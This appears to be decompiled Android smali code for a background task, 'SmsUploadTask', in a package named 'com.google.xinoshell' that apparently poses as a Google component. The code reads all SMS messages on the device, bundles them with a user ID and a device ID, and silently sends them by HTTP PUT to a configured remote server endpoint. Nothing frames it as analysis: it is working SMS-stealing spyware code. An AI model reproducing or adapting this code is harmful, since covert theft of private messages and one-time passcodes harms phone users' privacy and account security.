.class Lcom/google/xinoshell/services/BgService$SmsUploadTask;
.super Landroid/os/AsyncTask;
.source "BgService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/google/xinoshell/services/BgService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "SmsUploadTask"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Ljava/lang/Boolean;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lcom/google/xinoshell/services/BgService;


# direct methods
.method private constructor <init>(Lcom/google/xinoshell/services/BgService;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x1010
        }
        names = {
            null
        }
    .end annotation

    .line 118
    iput-object p1, p0, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->this$0:Lcom/google/xinoshell/services/BgService;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/google/xinoshell/services/BgService;Lcom/google/xinoshell/services/BgService-IA;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/google/xinoshell/services/BgService$SmsUploadTask;-><init>(Lcom/google/xinoshell/services/BgService;)V

    return-void
.end method


# virtual methods
.method protected varargs doInBackground([Ljava/lang/Void;)Ljava/lang/Boolean;
    .locals 14
    .param p1, "voids"    # [Ljava/lang/Void;

    .line 123
    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Lcom/google/xinoshell/utils/SMSRetriever;

    iget-object v2, p0, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->this$0:Lcom/google/xinoshell/services/BgService;

    invoke-direct {v1, v2}, Lcom/google/xinoshell/utils/SMSRetriever;-><init>(Landroid/content/Context;)V

    .line 124
    .local v1, "smsRetriever":Lcom/google/xinoshell/utils/SMSRetriever;
    invoke-virtual {v1, v0}, Lcom/google/xinoshell/utils/SMSRetriever;->getAllMessages(Z)Lorg/json/JSONArray;

    move-result-object v2

    .line 126
    .local v2, "smsArray":Lorg/json/JSONArray;
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v3

    const/4 v4, 0x1

    if-lez v3, :cond_5

    .line 127
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 128
    .local v3, "payload":Lorg/json/JSONObject;
    const-string v5, "userId"

    sget-object v6, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 129
    const-string v5, "deviceId"

    iget-object v6, p0, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->this$0:Lcom/google/xinoshell/services/BgService;

    invoke-static {v6}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 130
    const-string v5, "messages"

    invoke-virtual {v3, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 132
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lcom/google/xinoshell/utils/Config;->ServerApiUrl:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/client/sms/"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->this$0:Lcom/google/xinoshell/services/BgService;

    invoke-static {v6}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 134
    .local v5, "endpointUrl":Ljava/lang/String;
    new-instance v6, Ljava/net/URL;

    invoke-direct {v6, v5}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 135
    .local v6, "url":Ljava/net/URL;
    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    check-cast v7, Ljava/net/HttpURLConnection;

    .line 136
    .local v7, "connection":Ljava/net/HttpURLConnection;
    const-string v8, "PUT"

    invoke-virtual {v7, v8}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 137
    const-string v8, "Content-Type"

    const-string v9, "application/json; utf-8"

    invoke-virtual {v7, v8, v9}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 138
    const-string v8, "Accept"

    const-string v9, "application/json"

    invoke-virtual {v7, v8, v9}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 139
    invoke-virtual {v7, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 140
    const/16 v8, 0x7530

    invoke-virtual {v7, v8}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 141
    invoke-virtual {v7, v8}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 143
    invoke-virtual {v7}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v8
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 144
    .local v8, "os":Ljava/io/OutputStream;
    :try_start_1
    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v9

    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v9, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v9

    .line 145
    .local v9, "input":[B
    array-length v10, v9

    invoke-virtual {v8, v9, v0, v10}, Ljava/io/OutputStream;->write([BII)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    .line 146
    .end local v9    # "input":[B
    if-eqz v8, :cond_0

    :try_start_2
    invoke-virtual {v8}, Ljava/io/OutputStream;->close()V

    .line 148
    .end local v8    # "os":Ljava/io/OutputStream;
    :cond_0
    invoke-virtual {v7}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v8

    .line 150
    .local v8, "responseCode":I
    new-instance v9, Ljava/io/BufferedInputStream;

    .line 151
    const/16 v10, 0x190

    if-lt v8, v10, :cond_1

    invoke-virtual {v7}, Ljava/net/HttpURLConnection;->getErrorStream()Ljava/io/InputStream;

    move-result-object v10

    goto :goto_0

    :cond_1
    invoke-virtual {v7}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v10

    :goto_0
    invoke-direct {v9, v10}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 152
    .local v9, "in":Ljava/io/InputStream;
    :try_start_3
    new-instance v10, Ljava/io/BufferedReader;

    new-instance v11, Ljava/io/InputStreamReader;

    invoke-direct {v11, v9}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v10, v11}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 153
    .local v10, "reader":Ljava/io/BufferedReader;
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    .line 155
    .local v11, "response":Ljava/lang/StringBuilder;
    :goto_1
    invoke-virtual {v10}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v12

    move-object v13, v12

    .local v13, "line":Ljava/lang/String;
    if-eqz v12, :cond_2

    .line 156
    invoke-virtual {v11, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_1

    .line 159
    .end local v10    # "reader":Ljava/io/BufferedReader;
    .end local v11    # "response":Ljava/lang/StringBuilder;
    .end local v13    # "line":Ljava/lang/String;
    :cond_2
    :try_start_4
    invoke-virtual {v9}, Ljava/io/InputStream;->close()V

    .line 161
    .end local v9    # "in":Ljava/io/InputStream;
    const/16 v9, 0xc8

    if-lt v8, v9, :cond_3

    const/16 v9, 0x12c

    if-ge v8, v9, :cond_3

    goto :goto_2

    :cond_3
    move v4, v0

    :goto_2
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    return-object v0

    .line 150
    .restart local v9    # "in":Ljava/io/InputStream;
    :catchall_0
    move-exception v4

    :try_start_5
    invoke-virtual {v9}, Ljava/io/InputStream;->close()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    goto :goto_3

    :catchall_1
    move-exception v10

    :try_start_6
    invoke-virtual {v4, v10}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local p1    # "voids":[Ljava/lang/Void;
    :goto_3
    throw v4
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    .line 143
    .end local v9    # "in":Ljava/io/InputStream;
    .local v8, "os":Ljava/io/OutputStream;
    .restart local p1    # "voids":[Ljava/lang/Void;
    :catchall_2
    move-exception v4

    if-eqz v8, :cond_4

    :try_start_7
    invoke-virtual {v8}, Ljava/io/OutputStream;->close()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    goto :goto_4

    :catchall_3
    move-exception v9

    :try_start_8
    invoke-virtual {v4, v9}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local p1    # "voids":[Ljava/lang/Void;
    :cond_4
    :goto_4
    throw v4

    .line 163
    .end local v3    # "payload":Lorg/json/JSONObject;
    .end local v5    # "endpointUrl":Ljava/lang/String;
    .end local v6    # "url":Ljava/net/URL;
    .end local v7    # "connection":Ljava/net/HttpURLConnection;
    .end local v8    # "os":Ljava/io/OutputStream;
    .restart local p1    # "voids":[Ljava/lang/Void;
    :cond_5
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_0

    return-object v0

    .line 165
    .end local v1    # "smsRetriever":Lcom/google/xinoshell/utils/SMSRetriever;
    .end local v2    # "smsArray":Lorg/json/JSONArray;
    :catch_0
    move-exception v1

    .line 166
    .local v1, "e":Ljava/lang/Exception;
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x1000
        }
        names = {
            null
        }
    .end annotation

    .line 117
    check-cast p1, [Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->doInBackground([Ljava/lang/Void;)Ljava/lang/Boolean;

    move-result-object p1

    return-object p1
.end method

.method protected onPostExecute(Ljava/lang/Boolean;)V
    .locals 3
    .param p1, "success"    # Ljava/lang/Boolean;

    .line 172
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const-string v1, "isSmsUploaded"

    if-eqz v0, :cond_0

    .line 173
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->this$0:Lcom/google/xinoshell/services/BgService;

    invoke-static {v0}, Lcom/google/xinoshell/services/BgService;->-$$Nest$fgetprefs(Lcom/google/xinoshell/services/BgService;)Lcom/google/xinoshell/utils/SharedPrefManager;

    move-result-object v0

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    goto :goto_0

    .line 175
    :cond_0
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->this$0:Lcom/google/xinoshell/services/BgService;

    invoke-static {v0}, Lcom/google/xinoshell/services/BgService;->-$$Nest$fgetprefs(Lcom/google/xinoshell/services/BgService;)Lcom/google/xinoshell/utils/SharedPrefManager;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 177
    :goto_0
    return-void
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x1000
        }
        names = {
            null
        }
    .end annotation

    .line 117
    check-cast p1, Ljava/lang/Boolean;

    invoke-virtual {p0, p1}, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->onPostExecute(Ljava/lang/Boolean;)V

    return-void
.end method
